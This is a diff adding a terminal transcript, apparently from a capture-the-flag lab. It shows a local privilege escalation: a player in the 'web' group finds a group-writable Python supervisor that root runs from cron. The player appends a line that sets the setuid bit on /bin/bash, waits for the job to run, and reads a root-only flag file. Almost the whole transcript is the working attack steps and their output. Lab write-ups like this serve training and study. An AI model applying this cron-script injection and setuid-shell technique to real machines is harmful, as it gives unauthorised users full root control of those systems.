@@ -1,0 +1,59 @@
+$ id
+uid=1001(player) gid=1001(player) groups=1001(player),996(web)
+
+$ cat /etc/cron.d/monitor
+# Monitor supervisor (managed by ops)
+* * * * * root /usr/bin/python3 /opt/monitor/supervisor.py
+
+$ ls -la /opt/monitor/
+total 24
+drwxr-xr-x 1 root root 4096 Nov 19 00:10 .
+drwxr-xr-x 1 root root 4096 Nov 19 00:10 ..
+-rw-r--r-- 1 root root   33 Nov 19 00:10 app.py
+-rw-rw-r-- 1 root web   583 Nov 19 00:10 supervisor.py
+
+$ head -3 /opt/monitor/supervisor.py
+#!/usr/bin/python3
+# Supervisor for the monitor app.
+# Runs as root every minute and re-executes the monitored app script.
+
+$ ls -ld /var/log/monitor; ls -l /flag.txt
+drwxr-xr-x 1 root root 4096 Nov 19 00:11 /var/log/monitor
+-r-------- 1 root root 18 Nov 19 00:10 /flag.txt
+
+$ tail -4 /var/log/monitor/supervisor.log
+[2026-11-19 00:17:01] checking monitor app
+[2026-11-19 00:17:01] supervisor done
+[2026-11-19 00:18:01] checking monitor app
+[2026-11-19 00:18:01] supervisor done
+
+$ echo x >> /opt/monitor/app.py
+bash: line 1: /opt/monitor/app.py: Permission denied
+
+$ echo x >> /etc/cron.d/monitor
+bash: line 1: /etc/cron.d/monitor: Permission denied
+
+$ mv /opt/monitor/supervisor.py /tmp/
+mv: cannot move '/opt/monitor/supervisor.py' to '/tmp/supervisor.py': Permission denied
+
+$ touch /var/log/monitor/x.log
+touch: cannot touch '/var/log/monitor/x.log': Permission denied
+
+$ echo 'import os; os.system("chmod 4755 /bin/bash")' >> /opt/monitor/supervisor.py; tail -2 /opt/monitor/supervisor.py
+    main()
+import os; os.system("chmod 4755 /bin/bash")
+
+$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+
+$ tail -2 /var/log/monitor/supervisor.log
+[2026-11-19 00:20:01] checking monitor app
+[2026-11-19 00:20:01] supervisor done
+
+$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+
+$ /bin/bash -p -c 'id; cat /flag.txt'
+uid=1001(player) gid=1001(player) euid=0(root) groups=1001(player),996(web)
+Ly_Flag{tensgvco}
+
